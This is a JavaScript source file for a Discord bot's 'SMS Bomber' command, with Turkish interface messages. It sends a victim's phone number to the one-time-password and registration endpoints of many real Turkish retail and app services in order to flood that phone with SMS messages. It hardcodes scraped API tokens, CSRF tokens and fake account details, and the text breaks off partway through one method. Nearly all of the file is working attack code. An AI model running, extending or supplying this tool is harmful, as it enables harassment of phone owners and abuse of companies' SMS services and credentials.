const { MessageEmbed } = require("discord.js");

class SmsBomber {
    constructor(phone, interaction, mode) {
        this.phone = phone;
        this.mail = "whiskyloreanqweewq@gmail.com"
        this.interaction = interaction;
        this.mode = mode;
        this.data = [];
        this.success = 0;
        this.error = 0;
    }

    mesajiEditle() {
        if (this.mode != "tekFirma") {
            if (this.mode == "cift") {
                if (this.data.length >= 50) {
                    this.interaction.editReply({ embeds: [new MessageEmbed().setAuthor("Başarılı!", this.interaction.user.displayAvatarURL({ dynamic: true })).setDescription(`:white_check_mark: SMS Bomber saldırısı başladı! \n:telephone: Hedef Numara: ||**${this.phone}**|| \n🎯 Gönderim Modu: ${this.mode.replace("tekli", "Tekli Gönderim").replace("cift", "Çift Gönderim")} \n\n\`\`\`ansi\n${this.data.slice(50).join("\n")}\`\`\``).setFooter("ＨＥＳＡＰＰＸＮＥＬ - SMS Bomber", this.interaction.user.displayAvatarURL({ dynamic: true })).setTimestamp().setColor("GREEN"), new MessageEmbed().setAuthor("Saldırı devam ediyor..", this.interaction.user.displayAvatarURL({ dynamic: true })).setDescription(`Mesaj, **Discord** limitini aştığı için daha fazla güncellenmeyecektir ancak saldırı devam etmektedir..`).setFooter("Whisky Lorean - SMS Bomber", this.interaction.user.displayAvatarURL({ dynamic: true })).setTimestamp().setColor("GREEN")], ephemeral: true });
                    //new MessageEmbed().setAuthor("Saldırı devam ediyor..", this.interaction.user.displayAvatarURL({ dynamic: true })).setDescription(`\`\`\`ansi\n${this.data.slice(39).join("\n")}\`\`\``).setFooter("Whisky Lorean - SMS Bomber", this.interaction.user.displayAvatarURL({ dynamic: true })).setTimestamp().setColor("GREEN")
                } else {
                    this.interaction.editReply({ embeds: [new MessageEmbed().setAuthor("Başarılı!", this.interaction.user.displayAvatarURL({ dynamic: true })).setDescription(`:white_check_mark: SMS Bomber saldırısı başladı! \n:telephone: Hedef Numara: ||**${this.phone}**|| \n🎯 Gönderim Modu: ${this.mode.replace("tekli", "Tekli Gönderim").replace("cift", "Çift Gönderim")} \n\n\`\`\`ansi\n${this.data.join("\n")}\`\`\``).setFooter("ＨＥＳＡＰＰＸＮＥＬ - SMS Bomber", this.interaction.user.displayAvatarURL({ dynamic: true })).setTimestamp().setColor("GREEN")], ephemeral: true });
                }
            } else {
                this.interaction.editReply({ embeds: [new MessageEmbed().setAuthor("Başarılı!", this.interaction.user.displayAvatarURL({ dynamic: true })).setDescription(`:white_check_mark: SMS Bomber saldırısı başladı! \n:telephone: Hedef Numara: ||**${this.phone}**|| \n🎯 Gönderim Modu: ${this.mode.replace("tekli", "Tekli Gönderim").replace("cift", "Çift Gönderim")} \n\n\`\`\`ansi\n${this.data.join("\n")}\`\`\``).setFooter("ＨＥＳＡＰＰＸＮＥＬ - SMS Bomber", this.interaction.user.displayAvatarURL({ dynamic: true })).setTimestamp().setColor("GREEN")], ephemeral: true });
            }
        } else {
            this.interaction.editReply({ embeds: [new MessageEmbed().setAuthor("Başarılı!", this.interaction.user.displayAvatarURL({ dynamic: true })).setDescription(`:white_check_mark: SMS Bomber saldırısı başladı! \n:telephone: Hedef Numara: ||**${this.phone}**|| \n\n\`\`\`ansi\n${this.data.join("\n")}\`\`\``).setFooter("ＨＥＳＡＰＰＸＮＥＬ - SMS Bomber", this.interaction.user.displayAvatarURL({ dynamic: true })).setTimestamp().setColor("GREEN")], ephemeral: true });
        }  
    }

    async kahveDunyasi() {
        try {
            const url = "https://core.kahvedunyasi.com:443/api/users/sys/sms/send";
            const headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Page-Url": "/kayit-ol",
                "Content-Type": "application/json;charset=utf-8",
                "Positive-Client": "kahvedunyasi",
                "Positive-Client-Type": "web",
                "Store-Id": "1",
                "Origin": "https://www.kahvedunyasi.com",
                "Dnt": "1",
                "Sec-Gpc": "1",
                "Referer": "https://www.kahvedunyasi.com/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site",
                "Te": "trailers",
                "Connection": "close"
            };
            const json = { mobile_number: this.phone, token_type: "register_token" };
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });

            if (response.status === 200) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> core.kahvedunyasi.com`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> core.kahvedunyasi.com`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> core.kahvedunyasi.com`);
            this.error += 1;
        }

        this.mesajiEditle();
    };

    async wmf() {
        try {
            const response = await fetch("https://www.wmf.com.tr/users/register/", {
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                body: new URLSearchParams({
                    "confirm": "true",
                    "date_of_birth": "1956-12-18",
                    "email": this.mail,
                    "email_allowed": "true",
                    "first_name": "Whisky",
                    "gender": "male",
                    "last_name": "Lorean",
                    "password": "29ZEY..zey18",
                    "phone": `0${this.phone}`
                })
            });
    
            if (response.status === 202) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> wmf.com.tr`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> wmf.com.tr`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> wmf.com.tr`);
            this.error += 1;
        }

        this.mesajiEditle();
    };    

    async bim() {
        try {
            const response = await fetch("https://bim.veesk.net:443/service/v1.0/account/login", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ phone: this.phone })
            });
    
            if (response.status === 200) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> bim.veesk.net`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> bim.veesk.net`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> bim.veesk.net`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async englishHome() {
        try {
            const url = "https://www.englishhome.com:443/api/member/sendOtp";
            const headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Referer": "https://www.englishhome.com/",
                "Content-Type": "application/json",
                "Origin": "https://www.englishhome.com",
                "Dnt": "1",
                "Sec-Gpc": "1",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "Te": "trailers"
            };
            const json = { "Phone": "+90" + this.phone };
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });
            const data = await response.json();
            if (!data.isError) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> englishhome.com`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> englishhome.com`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> englishhome.com`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async icq() {
        try {
            const url = `https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90${this.phone}&platform=ios&r=796356153&smsFormatType=human`;
            const headers = {
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "ICQ iOS #no_user_id# gu19PNBblQjCdbMU 23.1.1(124106) 15.7.7 iPhone9,4",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate"
            };
            
            const response = await fetch(url, {
                method: 'POST',
                headers: headers
            });
            
            const data = await response.json();
            
            if (data.response.statusCode === 200) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> u.icq.net`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> u.icq.net`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> u.icq.net`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async suIste() {
        try {
            const url = "https://suiste.com:443/api/auth/code";
            const headers = {
                "Accept": "application/json",
                "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
                "Accept-Encoding": "gzip, deflate",
                "Mobillium-Device-Id": "56DB9AC4-F52B-4DF1-B14C-E39690BC69FC",
                "User-Agent": "suiste/1.6.16 (com.mobillium.suiste; build:1434; iOS 15.7.7) Alamofire/5.6.4",
                "Accept-Language": "en"
            };
            const data = new URLSearchParams({
                "action": "register",
                "gsm": this.phone
            });
    
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: data
            });
    
            const json = await response.json();
            if (json.code === "common.success") {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> suiste.com`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> suiste.com`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> suiste.com`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async kimGb() {
        try {
            const response = await fetch("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ msisdn: `90${this.phone}` })
            });
    
            if (response.status === 200) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async tazi() {
        try {
            const url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin";
            const headers = {
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json;charset=utf-8",
                "Accept-Encoding": "gzip, deflate",
                "User-Agent": "Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0",
                "Accept-Language": "tr-TR,tr;q=0.9",
                "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"
            };
            const json = { "cep_tel": this.phone, "cep_tel_ulkekod": "90" };
            
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });
            
            const data = await response.json();
            
            if (data.kod === "0000") {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> mobileapiv2.tazi.tech`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> mobileapiv2.tazi.tech`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> mobileapiv2.tazi.tech`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async hey() {
        try {
            const url = `https://heyapi.heymobility.tech:443/V14//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber=${this.phone}&requestid=18bca4e4-2f45-41b0-b054-3efd5b2c9c57-20230730&territoryId=738211d4-fd9d-4168-81a6-b7dbf91170e9`;
            const headers = {
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate",
                "User-Agent": "HEY!%20Scooter/143 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                "Accept-Language": "tr"
            };
            const response = await fetch(url, {
                method: 'POST',
                headers: headers
            });
            const data = await response.json();
            if (data.IsSuccess === true) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> heyapi.heymobility.tech`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> heyapi.heymobility.tech`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> heyapi.heymobility.tech`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async biSu() {
        try {
            const url = "https://www.bisu.com.tr:443/api/v2/app/authentication/phone/register";
            const headers = {
                "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
                "X-Device-Platform": "IOS",
                "X-Build-Version-Name": "9.4.0",
                "Authorization": "0561b4dd-e668-48ac-b65e-5afa99bf098e",
                "X-Build-Version-Code": "22",
                "Accept": "*/*",
                "X-Device-Manufacturer": "Apple",
                "X-Device-Locale": "en",
                "X-Client-Device-Id": "66585653-CB6A-48CA-A42D-3F266677E3B5",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate",
                "X-Device-Platform-Version": "15.7.7",
                "User-Agent": "BiSU/22 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                "X-Device-Model": "iPhone 7 Plus",
                "X-Build-Type": "Release"
            };
            const data = new URLSearchParams();
            data.append("phoneNumber", this.phone);
    
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: data
            });
            const json = await response.json();
    
            if (json.errors == null) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> bisu.com.tr`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> bisu.com.tr`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> bisu.com.tr`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async ucDortBes() {
        try {
            const url = "https://api.345dijital.com:443/api/users/register";
            const headers = {
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json",
                "Accept-Encoding": "gzip, deflate",
                "User-Agent": "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                "Accept-Language": "en-US,en;q=0.9",
                "Authorization": "null",
                "Connection": "close"
            };
            const json = {
                "email": this.mail,
                "name": "Whisky",
                "phoneNumber": `+90${this.phone}`,
                "surname": "Lorean"
            };
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });
            const data = await response.json();

            if (data.error === "E-Posta veya telefon zaten kayıtlı!") {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> api.345dijital.com`);
                this.error += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> api.345dijital.com`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> api.345dijital.com`);
            this.success += 1;
        }

        this.mesajiEditle();
    };
    
    async macro() {
        try {
            const url = "https://www.macrocenter.com.tr:443/rest/users/register/otp?reid=31";
            const headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
                "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Referer": "https://www.macrocenter.com.tr/kayit",
                "Content-Type": "application/json",
                "X-Forwarded-Rest": "true",
                "X-Pwa": "true",
                "X-Device-Pwa": "true",
                "Origin": "https://www.macrocenter.com.tr",
                "Dnt": "1",
                "Sec-Gpc": "1",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "Te": "trailers"
            };
            const json = { email: this.mail, phoneNumber: this.phone };

            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });

            const data = await response.json();

            if (data.successful === true) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> macrocenter.com.tr`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> macrocenter.com.tr`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> macrocenter.com.tr`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async tiklaGelsin() {
        try {
            const url = "https://svc.apps.tiklagelsin.com:443/user/graphql";
            const headers = {
                "Content-Type": "application/json",
                "X-Merchant-Type": "0",
                "Accept": "*/*",
                "Appversion": "2.4.1",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate",
                "X-No-Auth": "true",
                "User-Agent": "TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                "X-Device-Type": "2"
            };
            const json = {
                operationName: "GENERATE_OTP",
                query: `mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {
                    generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)
                }`,
                variables: {
                    challenge: "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68",
                    deviceUniqueId: "720932D5-47BD-46CD-A4B8-086EC49F81AB",
                    phone: `+90${this.phone}`
                }
            };
            
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });
            
            const data = await response.json();

            if (data.data.generateOtp === true) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> svc.apps.tiklagelsin.com`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> svc.apps.tiklagelsin.com`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> svc.apps.tiklagelsin.com`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async altinYildiz() {
        try {
            const url = `https://api.altinyildizclassics.com:443/mobileapi2/autapi/CreateSmsOtpForRegister?gsm=${this.phone}`;
            const headers = {
                "Accept": "*/*",
                "Token": "MXZ5NTJ82WXBUJB7KBP10AGR3AF6S4GB95VZDU4G44JFEIN3WISAC2KLRIBNONQ7QVCZXM3ZHI661AMVXLKJLF9HUKI5SQ2ROMZS",
                "Devicetype": "mobileapp",
                "Accept-Encoding": "gzip, deflate",
                "User-Agent": "altinyildiz/2.7 (com.brmagazacilik.altinyildiz; build:2; iOS 15.7.7) Alamofire/2.7",
                "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9"
            };
            const response = await fetch(url, {
                method: 'POST',
                headers: headers
            });

            const data = await response.json();

            if (data.Success === true) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> api.altinyildizclassics.com`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> api.altinyildizclassics.com`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> api.altinyildizclassics.com`);
            this.error += 1;
        }

        this.mesajiEditle();
    };

    async naosStars() {
        try {
            const url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350";
            const headers = {
                "Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351",
                "User-Agent": "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                "Access-Control-Allow-Origin": "*",
                "Locale": "en-TR",
                "Version": "1.0030",
                "Os": "ios",
                "Apiurl": "https://api.naosstars.com/api/",
                "Device-Id": "D41CE5F3-53BB-42CF-8611-B4FE7529C9BC",
                "Platform": "ios",
                "Accept-Language": "en-US,en;q=0.9",
                "Timezone": "Europe/Istanbul",
                "Globaluuidv4": "d57bd5d2-cf1e-420c-b43d-61117cf9b517",
                "Timezoneoffset": "-180",
                "Accept": "application/json",
                "Content-Type": "application/json; charset=utf-8",
                "Accept-Encoding": "gzip, deflate",
                "Apitype": "mobile_app"
            };
            const json = { "telephone": `+90${this.phone}`, "type": "register" };
            
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });
            
            if (response.status === 200) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> api.naosstars.com`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> api.naosstars.com`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> api.naosstars.com`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async isteGelsin() {
        try {
            const url = "https://prod.fasapi.net:443/";
            const headers = {
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded",
                "App-Version": "2528",
                "Accept-Encoding": "gzip, deflate",
                "Platform": "IOS",
                "User-Agent": "ig-sonkullanici-ios/161 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                "Accept-Language": "en-US,en;q=0.9"
            };
            const json = {
                "operationName": "SendOtp2",
                "query": "mutation SendOtp2($phoneNumber: String!) {\n  sendOtp2(phoneNumber: $phoneNumber) {\n    __typename\n    alreadySent\n    remainingTime\n  }\n}",
                "variables": { "phoneNumber": `90${this.phone}` }
            };
            
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });
            
            const data = await response.json();
            
            if (data.data.sendOtp2.alreadySent === false) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> prod.fasapi.net`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> prod.fasapi.net`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> prod.fasapi.net`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async hayatSu() {
        try {
            const url = "https://api.hayatsu.com.tr:443/api/SignUp/SendOtp";
            const headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Referer": "https://www.hayatsu.com.tr/",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJhMTA5MWQ1ZS0wYjg3LTRjYWQtOWIxZi0yNTllMDI1MjY0MmMiLCJsb2dpbmRhdGUiOiIxOS4wMS4yMDI0IDIyOjU3OjM3Iiwibm90dXNlciI6InRydWUiLCJwaG9uZU51bWJlciI6IiIsImV4cCI6MTcyMTI0NjI1NywiaXNzIjoiaHR0cHM6Ly9oYXlhdHN1LmNvbS50ciIsImF1ZCI6Imh0dHBzOi8vaGF5YXRzdS5jb20udHIifQ.Cip4hOxGPVz7R2eBPbq95k6EoICTnPLW9o2eDY6qKMM",
                "Origin": "https://www.hayatsu.com.tr",
                "Dnt": "1",
                "Sec-Gpc": "1",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site",
                "Te": "trailers"
            };
            const data = new URLSearchParams({
                mobilePhoneNumber: this.phone,
                actionType: "register"
            });
    
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: data
            });
    
            const result = await response.json();

            if (result.is_success === true) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> api.hayatsu.com.tr`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> api.hayatsu.com.tr`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> api.hayatsu.com.tr`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async evIdea() {
        try {
            const url = "https://www.evidea.com:443/users/register/";
            const headers = {
                "Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi",
                "X-Project-Name": "undefined",
                "Accept": "application/json, text/plain, */*",
                "X-App-Type": "akinon-mobile",
                "X-Requested-With": "XMLHttpRequest",
                "Accept-Language": "tr-TR,tr;q=0.9",
                "Cache-Control": "no-store",
                "Accept-Encoding": "gzip, deflate",
                "X-App-Device": "ios",
                "Referer": "https://www.evidea.com/",
                "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0",
                "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"
            };
            const data = `--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="first_name"\r\n\r\nWhisky\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="last_name"\r\n\r\nLorean\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="email"\r\n\r\n${this.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="email_allowed"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="sms_allowed"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="password"\r\n\r\n29ZEY..zey18\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="phone"\r\n\r\n0${this.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="confirm"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n`;
            
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: data
            });
    
            if (response.status === 202) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> evidea.com`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> evidea.com`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> evidea.com`);
            this.error += 1;
        }

        this.mesajiEditle();
    };
    
    async koton() {
        try {
            const url = "https://www.koton.com:443/users/register/";
            const headers = {
                "Content-Type": "multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk",
                "X-Project-Name": "rn-env",
                "Accept": "application/json, text/plain, */*",
                "X-App-Type": "akinon-mobile",
                "X-Requested-With": "XMLHttpRequest",
                "Accept-Language": "en-US,en;q=0.9",
                "Cache-Control": "no-store",
                "Accept-Encoding": "gzip, deflate",
                "X-App-Device": "ios",
                "Referer": "https://www.koton.com/",
                "User-Agent": "Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                "X-Csrftoken": "5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz"
            };
            const data = `--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="first_name"\r\n\r\nMerdo\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="last_name"\r\n\r\nLorean\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="email"\r\n\r\n${this.mail}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="password"\r\n\r\n29ZEY..zey18\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="phone"\r\n\r\n0${this.phone}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="confirm"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="sms_allowed"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="email_allowed"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="date_of_birth"\r\n\r\n1993-07-02\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; 